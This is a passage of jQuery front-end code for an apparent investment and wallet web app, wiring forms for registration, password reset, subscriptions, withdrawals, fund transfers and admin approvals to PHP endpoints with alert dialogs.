			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "A reset password link has been sent to you email"
		});
		setTimeout( function(){ window.location.href = "forgot_password";}, 4000);
	 }
	 else if(data == 600){

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Empty field(s) found"
		});
	 }
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Please provide your registered email"
		});
	 }
		
  }
  });
});
//end forgot password

//start reset password

$('#reset_password').click(function(e){
e.preventDefault();
$.ajax({
  url:"ajax_scripts/reset_pword.php",
  method:"POST",
  data:$('#reset_password_form').serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Your password has been reset successfully"
		});
		setTimeout( function(){ window.location.href = "login";}, 4000);
	 }	

	  else if(data == "empty_fields"){

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Empty field(s) seen"
		});
	 }


	 else if(data == "Passwords Doens't Match"){

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Passwords Don't Match"
		});
	 }


	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Server Error Occured"
		});
	 }
		
  }
  });
//end reset password
});
 
// Start Update_user
// $('#update_user').click(function(e){
// console.log('hello')
// $.ajax({
//   url:"ajax_scripts/update_user.php",
//   method:"POST",
//   data:$('#update_form').serialize(),
//   success:function(data){
// 	 if(data == 200){
// 	 		$.alert({
// 			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
// 			closeAnimation: 'left',content: "Your Profile has been updated Successfully"
// 		});
// 		setTimeout( function(){ window.location.href = "see_profile";}, 1000);
// 	 }	
// 	 else{

// 	 	$.alert({
// 			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
// 			closeAnimation: 'left',content: "Error in Updating"
// 		});
// 	 }
		
//   }
//   });
//  e.preventDefault();
// });


// Update Next Of Kin
$('#update_next_of_kin').click(function(e){

console.log('hello')	
$.ajax({
  url:"ajax_scripts/update_next_of_kin.php",
  method:"POST",
  data:$('#update_next_of_kin_form').serialize(),
  success:function(data){
	 if(data == 200){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Your Profile has been updated Successfully"
		});
		setTimeout( function(){ window.location.href = "see_profile";}, 4000);
	 }	
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in Updating"
		});
	 }
		
  }
  });
 e.preventDefault();
});


// Update bank details
// $('#update_bank_details').click(function(e){

// console.log('hello')
// $.ajax({
//   url:"ajax_scripts/update_bank_details.php",
//   method:"POST",
//   data:$('#update_bank_details_form').serialize(),
//   success:function(data){
// 	 if(data == 200){
// 	 		$.alert({
// 			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
// 			closeAnimation: 'left',content: "Your Profile has been updated Successfully"
// 		});
// 		setTimeout( function(){ window.location.href = "see_profile";}, 1000);
// 	 }	
// 	 else{

// 	 	$.alert({
// 			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
// 			closeAnimation: 'left',content: "Error in Updating"
// 		});
// 	 }
		
//   }
//   });
//  e.preventDefault();
// });


//liquidate package
$('.get_subscribed_id').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_scripts/liquidate_sub.php",
  method:"POST",
  data:$('#liquidate_package_form'+id).serialize(),
  success:function(data){
  	// alert(data);
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Your request is been processed"
		});
		setTimeout( function(){ window.location.href = "investment_package";}, 4000);
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in sending request"
		});
	 }
		
  }
  });
});




// Get amount Total
$('.get_total').click(function(){
    let id = $(this).attr('id');
    //alert(id);
    let slots = $('#slot'+id).val();
   
    let value = $('#package_amount'+id).val();
    let total = slots * value;
    $('#total'+id).text(total);
});

// User subscription to a package
$('.subscribe').click(function(e){
  let id = $(this).attr('id');
   let slots = $('#slot'+id).val();
  //console.log('hello');
  //alert(id);
  $.ajax({
  url:"ajax_scripts/subscribe.php",
  method:"POST",
  data:$('#subscribe_form'+id).serialize(),
  success:function(data){
	 if(data == 200){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "You have Successfully subscribed"
		});
		//setTimeout( function(){ window.location.href = "package_sub";}, 1000);
		$('#view'+id).modal('hide');
	 }	


	else if(data == 250){

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "You have already subscribed to this package"
		});
	 }

	  else if(data== 300){

	  	$.alert({
	 		title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
	 		closeAnimation: 'left',content: "Less available slot"
	 	});
	  }


	  else if(data == 350){

	  	$.alert({
	 		title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
	 		closeAnimation: 'left',content: "Your wallet balance is insufficient"
	 	});
	  }

	  else if(data == 400){

	  	$.alert({
	 		title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
	 		closeAnimation: 'left',content: "Invalid number of months"
	 	});
	  }


	  else if(data == 450){

	  	$.alert({
	 		title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
	 		closeAnimation: 'left',content: "Error in getting slot balance"
	 	});
	  }


	  else if(data == 550){

	  	$.alert({
	 		title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
	 		closeAnimation: 'left',content: "Insertion Error"
	 	});
	  }


	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in subscribing"
		});
	 }


	 

		//alert(data);
  }
  });
 e.preventDefault();
});


//////add slot log
$('#add_slot').click(function(e){
e.preventDefault();
$.ajax({
  url:"ajax_admin/add_slot.php",
  method:"POST",
  data:$('#create_slot_form').serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Slot added successfully"
		});
		setTimeout( function(){ window.location.href = "packages_slot_log"}, 4000);
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in adding slot"
		});
	 }
	 //alert(data);
		
  }
  });
});
////end slot log



//////add slot log
$('#get_withdrawable_profit').change(function(e){
e.preventDefault();
 var package_id = $(this).val();
 //alert(package_id);
 $.ajax({
  url:"ajax_scripts/get_profit_per_package.php",
  data:{package_id:package_id},
  success:function(datas){
	 // if(data == "success"){
	 // 		$.alert({
		// 	title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
		// 	closeAnimation: 'left',content: "Slot added successfully"
		// });
		// setTimeout( function(){ window.location.href = "packages_slot_log"}, 1000);
	 // }	
	 
	 // else{

	 // 	$.alert({
		// 	title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
		// 	closeAnimation: 'left',content: "Error in adding slot"
		// });
	 // }
	 $('#show_profit').empty();
	 var newdata = "<input type='hidden' name='profit' id='profit' value="+datas+"><span>Withdrawable Profit: &#8358;"+datas+"</span><hr>";
	 $('#show_profit').html(newdata);
		
  }
  });
});


$("#transfer_earnings_to_wallet").click(function(e){
		e.preventDefault();
		var total_earnings = $('#total_earnings').val();
		alert(total_earnings);
			$.ajax({
			url:"ajax_scripts/transfer_earnings_to_wallet.php",
			data: $('#earnings_to_wallet_form').serialize(),
			method:"POST",
			success:function(data){
			if( parseInt(data) === 1){
			$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Transfer  of "+amount_to_withdraw+" to Wallet was sent successfully"
			});
			setTimeout( function(){ window.location.href = "earnings_to_wallet"}, 4000);
			}	

			else{

			$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in sending to wallet"
			});
			}

		
			}
			});

	

});


$("#wallet_withdraw").click(function(){
		var amount_to_withdraw = $('#amount_to_withdraw').val();
		var withdraw_balance = $('#wallet_balance').val();

    //     if(amount_to_withdraw < 1000){
    //     	$.alert({
		  //   title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			 //closeAnimation: 'left',content: "Withdrawal amount is too small"
			 //});
    //     } else{

        	$.ajax({
			url:"ajax_scripts/withdraw_from_just_wallet.php",
			data: $('#wallet_withdrawal_form').serialize(),
			method:"POST",
			success:function(data){
			if( parseInt(data) === 200){
			$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Withdrawal request sent successfully, it will be made available as soon as all verifications have been done."
			});
			setTimeout( function(){ window.location.href = "withdrawal_requests"}, 8000);
			}


			else if(parseInt(data) === 300){
			$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Your Wallet has been deactivated, please contact FarmKonnect for more information"
			});
			}
			
			else if(parseInt(data) === 350){
			$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Empty field(s) found"
			});
			}
			
			else if(parseInt(data) === 500){
			$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Insufficient wallet balance"
			});
			}

			else{

			$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in placing withdrawal"
			});
			}
			//alert(data);
		
			}
			});

        //}

		
});

//Start Register

$('.register').click(function(e){

//console.log('hello')
$.ajax({
  url:"ajax_scripts/registration.php",
  method:"POST",
  data:$('#register_form').serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Registration was successful, a verification email has been sent also."
		});
		setTimeout( function(){ window.location.href = "login";},7000);
	 }	

	 else if(data == "empty_fields"){

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Empty field(s) seen"
		});
	 }


	 else if(data == "record_exists"){

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Record already exists"
		});
	 }


	 else if(data == "password_mismatch"){

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Passwords Don't Match"
		});
	 }


	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in Registering"
		});
	 }
	 //alert(data);
		
  }
  });
 e.preventDefault();
});

//End Register


//Start Register AFF

$('.register_affilliate').click(function(e){

$.ajax({
  url:"ajax_aff/affilliate_registration.php",
  method:"POST",
  data:$('#aff_register_form').serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Affiliate Registration was successful, a verification email has been sent also."
		});
		setTimeout( function(){ window.location.href = "home";},7000);
	 }	
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in Registering Affilliate Account"
		});
	 }
	//alert(data);
		
  }
  });
 e.preventDefault();

 });

//End Register aff

$('#cmd_create_lead').click(function(e){

$.ajax({
  url:"ajax_aff/create_lead.php",
  method:"POST",
  data:$('#create_lead_form').serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Lead was successfully created."
		});
		setTimeout( function(){ window.location.href = "view_leads";}, 4000);
	 }	
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in creating a new Lead"
		});
	}
	//alert(data);
		
  }
  });
 e.preventDefault();

 });




$('#cmd_msg_to_leads').click(function(e){
 let message = CKEDITOR.instances['generic'].getData();
 let subject = $('#subject').val();
 //alert(subject);
	$.ajax({
	url:"ajax_aff/send_msgs_to_leads.php",
	method:"POST",
	data:{message:message,subject:subject},
	// beforeSend:function(){
	// 		$.alert({
	// 		title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
	// 		closeAnimation: 'left',content: "Loading...."
	// 	});
	// },
	success:function(data){
	// if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Message has been successfully sent to your Leads."
		});
		setTimeout( function(){ window.location.href = "view_leads";}, 7000);
	// }	
	//  else{

	//  	$.alert({
	// 		title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
	// 		closeAnimation: 'left',content: "Error in creating a new Lead"
	// 	});
	// }
	//alert(data);
		
	}
	});
 e.preventDefault();

 });




//Tosin...
//activate fund transfer
$('#activate_transfer_fund').click(function(e){
e.preventDefault();
for ( instance in CKEDITOR.instances )
       CKEDITOR.instances[instance].updateElement();
 $.ajax({
  url:"ajax_scripts/activate_transfer_fund.php",
  method:"POST",
  data:$('#terms_and_conditions').serialize(),
  success:function(data){
	 if(data == "error"){
		$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Ensure you have agreed to terms and conditions"
		});
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "You have successfully requested activation of wallet-to-wallet funds tranfer"
		});
		setTimeout( function(){ window.location.href = "transfer_funds"}, 8000);

	 }

  }
  });
});


//transfer funds
$('#transfer_funds').click(function(e){
e.preventDefault();
 $.ajax({
  url:"ajax_scripts/transfer_fund.php",
  method:"POST",
  data:$('#transfer_funds_form').serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Success! Funds Transfer Successful"
		});
		setTimeout( function(){ window.location.href = "transfer_funds"}, 4000);
	 }	

	 else if(data == "empty_fields"){
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Empty fields found"
		});
	 }

	 else if(data == "user_does_not_exist"){
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Email does not exist"
		});
	 }

	 else if(data == "balance_less"){
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Your wallet balance is insufficient"
		});
	 }

	 else if(data == "wallet_deactivated"){
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Your wallet has been deactivated, please contact FarmKonnect for more information"
		});
	 }


	else if(data == "incorrect_transfer_pin"){
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Incorrect Transfer Pin, please type in your correct pin"
		});
	 }
	 

	 else if(data == "success_creating_log"){
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Transfer Awaiting Admin's Approval"
		});
	 }


	else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in transfering funds"
		});
	 }
	 //alert(data);
  }
  });
});


//delete document
$('.get_delete_id').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_scripts/delete_document.php",
  method:"POST",
  data:$('#document_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Document deleted successfully"
		});
	 	setTimeout( function(){ window.location.href = "documents";}, 4000);
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in deleting document"
		});
	 }
		
  }
  });
});



//submit access card request
$('#submit_request').click(function(e){
e.preventDefault();
 $.ajax({
  url:"ajax_scripts/request_access_card.php",
  method:"POST",
  data:$('#card_request_form').serialize(),
  beforeSend:function(){
  	$('#submit_request').text("Submitting");
		$('#submit_request').attr("disabled", true);
  },
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Request successfully submitted"
		});
		setTimeout( function(){ window.location.href = "access_card"}, 4000);
	 }	


	 else if(data == "record_exists"){

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Record already exists"
		});
	 }
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in submitting request"
		});
	 }
	 $('#submit_request').text("Submit Access Card Request");
		$('#submit_request').attr("disabled", true);
  }
  });
});


//deactivate card
$('#deactivate_card').click(function(e){
e.preventDefault();
 $.ajax({
  url:"ajax_scripts/deactivate_card.php",
  method:"POST",
  beforeSend:function(){
  	$('#deactivate_card').text("Deactivating");
		$('#deactivate_card').attr("disabled", true);
  },
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Access Card successfully deactivated"
		});
		setTimeout( function(){ window.location.href = "access_card"}, 4000);
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in deactivating card"
		});
	 }
	 	$('#deactivate_card').text("Deactivate Card");
		$('#deactivate_card').attr("disabled", false);
  }
  });
});


//reactivate card
$('#reactivate_card').click(function(e){
e.preventDefault();
 $.ajax({
  url:"ajax_scripts/reactivate_card.php",
  method:"POST",
  beforeSend: function(){
  		$('#reactivate_card').text("Reactivating");
		$('#reactivate_card').attr("disabled", true);
  },
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Access Card successfully reactivated"
		});
		setTimeout( function(){ window.location.href = "access_card"}, 4000);
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in reactivating card"
		});
	 }
	 	$('#reactivate_card').text("Reactivate Card");
		$('#reactivate_card').attr("disabled", false);

  }
  });
});



//09-01-2020
//admin update package category
$('.get_package_id').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
// let name = "name"+id;
// let realname = $("#"+name).val();
// let desc = "description"+id;
// let realdesc = $("#"+desc).val();

//alert(realdesc);
$.ajax({
  url:"ajax_admin/update_package.php",
  method:"POST",
  data:$('#update_package_form'+id).serialize(),
  success:function(data){
  	// alert(data);
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Successfully updated Package"
		});
		setTimeout( function(){ window.location.href = "view_packages";}, 1000);
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error updating Package"
		});
	 }
		
  }
  });
e.preventDefault();

});


$('body').on('click', '.approve_request', function(e){
    e.preventDefault();    
let id = $(this).attr('id');
// let name = "name"+id;
// let realname = $("#"+name).val();
// let desc = "description"+id;
// let realdesc = $("#"+desc).val();

//alert(realdesc);
$.ajax({
  url:"ajax_admin/approve_withdrawal_request.php",
  method:"POST",
  data:$('#withdrawal_request_form'+id).serialize(),
  success:function(data){
  	// alert(data);
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Withdrawal has been approved"
		});
	 	$('.approve_modal').modal("hide");
		$('#approve_withdrawal_modal'+id).html("<small class='badge badge-success'>Approved</small>");
		//setTimeout( function(){ window.location.href = "withdrawal_request";}, 1000);
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error approving request"
		});
	 }
		
  }
  });
});


// $('body').on('click', '.approve_request_saa', function(e){
//     e.preventDefault(); 
//     alert('lllllllll');

// });

$('body').on('click', '.reject_request', function(e){
e.preventDefault();
let id = $(this).attr('id');
// let name = "name"+id;
// let realname = $("#"+name).val();
// let desc = "description"+id;
// let realdesc = $("#"+desc).val();

//alert(realdesc);
$.ajax({
  url:"ajax_admin/reject_withdrawal_request.php",
  method:"POST",
  data:$('#withdrawal_request_form'+id).serialize(),
  success:function(data){
  	// alert(data);
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Withdrawal rejected"
		});
	 	$('.reject_modal').modal("hide");
		$('#reject_withdrawal_modal'+id).html("<small class='badge badge-danger'>Rejected</small>");
		//setTimeout( function(){ window.location.href = "withdrawal_request";}, 1000);
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error rejecting request"
		});
	 }
		
  }
  });
});




$('.delete_document').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/delete_document.php",
  method:"POST",
  data:$('#delete_document_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Document deleted successfully"
		});
	 	setTimeout( function(){ window.location.href = "documents";}, 3000);
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in deleting document"
		});
	 }
		
  }
  });
});

//23-01-2020
$('.approve_credit_wallet').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
// let name = "name"+id;
// let realname = $("#"+name).val();
// let desc = "description"+id;
// let realdesc = $("#"+desc).val();

//alert(realdesc);
//alert(id);
$.ajax({
  url:"ajax_admin/approve_credit_wallet.php",
  method:"POST",
  data:$('#credit_wallet_form'+id).serialize(),
  success:function(data){
  	 //alert(data);
	 if(parseInt(data) === 200){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Credit Wallet Request has been approved"
		});
		setTimeout( function(){ window.location.href = "credit_wallet_history";}, 3000);
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error approving request"
		});
	 }
		
  }
  });
});


//23-01-2020
$('.reject_credit_wallet').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
// let name = "name"+id;
// let realname = $("#"+name).val();
// let desc = "description"+id;
// let realdesc = $("#"+desc).val();

//alert(realdesc);
//alert(id);
$.ajax({
  url:"ajax_admin/reject_credit_wallet.php",
  method:"POST",
  data:$('#credit_wallet_form'+id).serialize(),
  success:function(data){
  	 //alert(data);
	 if(parseInt(data) === 200){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Credit Wallet Request has been rejected"
		});
		setTimeout( function(){ window.location.href = "credit_wallet_history";}, 3000);
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error rejecting request"
		});
	 }
		
  }
  });
});

$('body').on('click', '.approve_transfer', function(e){
let id = $(this).attr('id');
// let name = "name"+id;
// let realname = $("#"+name).val();
// let desc = "description"+id;
// let realdesc = $("#"+desc).val();

//alert(realdesc);
$.ajax({
	beforeSend: function(){
		$('.approve_transfer').text("Approving");
		$('.approve_transfer').attr("disabled", true);
	},
  url:"ajax_admin/approve_pending_transfers.php",
  method:"POST",
  data:$('#transfer_request_form'+id).serialize(),
  success:function(data){
  	// alert(data);
	 if(parseInt(data) === 200){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Funds Transfer has been approved successfully"
		});
	 	$('.approve_modal').modal("hide");
		$('#approve_transfer_modal'+id).html("<small class='badge badge-success'>Approved</small>");
		//setTimeout( function(){ window.location.href = "pending_transfers";}, 1000);
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in approving transfer"
		});
	 }

	 $('.approve_transfer').text("Approve");
		$('.approve_transfer').attr("disabled", false);
		
  }
  });
});


$('.reject_transfer').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
// let name = "name"+id;
// let realname = $("#"+name).val();
// let desc = "description"+id;
// let realdesc = $("#"+desc).val();

//alert(realdesc);
//alert(id);
$.ajax({
	beforeSend: function(){
		 $('.reject_transfer').text("Rejecting");
		$('.reject_transfer').attr("disabled", true);
	},
  url:"ajax_admin/reject_pending_transfers.php",
  method:"POST",
  data:$('#transfer_request_form'+id).serialize(),
  success:function(data){
  	 //alert(data);
	 if(parseInt(data) === 200){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Funds Transfer has been rejected"
		});
		//setTimeout( function(){ window.location.href = "pending_transfers";}, 3000);
		$('.reject_modal').modal("hide");
		$('#reject_transfer_modal'+id).html("<small class='badge badge-danger'>Rejected</small>");
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error rejecting transfer"
		});
	 }
	  $('.reject_transfer').text("Reject");
		$('.reject_transfer').attr("disabled", false);
		
  }
  });
});

//03-03-2020

$('#add_role').click(function(e){
e.preventDefault();
for ( instance in CKEDITOR.instances )
        CKEDITOR.instances[instance].updateElement();
$.ajax({
	beforeSend: function(){
		$('#add_role').text("Adding");
		$('#add_role').attr("disabled", true);
	},
  url:"ajax_admin/add_role.php",
  method:"POST",
  data:$('#add_role_form').serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Role added successfully"
		});
		setTimeout( function(){ window.location.href = "manage_roles"}, 3000);
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in adding role"
		});
	 }
	//alert(data);
	 $('#add_role').text("Add Role");
	$('#add_role').attr("disabled", false);
		
  }
  });
});




$('.get_role_id').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/edit_role.php",
  method:"POST",
  data:$('#edit_role_form'+id).serialize(),
  success:function(data){
  	// alert(data);
	 if(parseInt(data) == 200){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Role updated successfully"
		});
		setTimeout( function(){ window.location.href = "manage_roles";}, 4000);
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in updating role"
		});
	 }
		
  }
  });
});



$('.archive_role').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/archive_role.php",
  method:"POST",
  data:$('#archive_role_form'+id).serialize(),
  success:function(data){
  	// alert(data);
	 if(parseInt(data) == 200){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Role archived successfully"
		});
		setTimeout( function(){ window.location.href = "manage_roles";}, 4000);
	 }	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in archiving role"
		});
	 }
		
  }
  });
});





$('#add_user_to_role').click(function(e){

//console.log('hello')
$.ajax({
	beforeSend: function(){
		$('#add_user_to_role').text("Adding");
		$('#add_user_to_role').attr("disabled", true);
	},
  url:"ajax_admin/add_user_to_role.php",
  method:"POST",
  data:$('#user_to_role_form').serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "User was added successfully"
		});
